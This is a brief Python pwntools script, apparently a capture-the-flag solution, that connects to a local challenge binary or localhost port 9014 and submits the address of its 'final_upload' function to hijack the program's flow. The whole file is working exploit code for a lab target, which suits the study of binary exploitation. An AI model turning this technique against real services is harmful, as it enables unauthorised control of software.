#!/usr/bin/env python3
from pwn import *

context.log_level = "error"
elf = ELF("./main", checksec=False)

p = process("./main") if args.LOCAL else remote("127.0.0.1", 9014)

address = elf.sym["final_upload"]
p.sendlineafter(b"> ", hex(address).encode())

print(p.recvall().decode())
p.close()
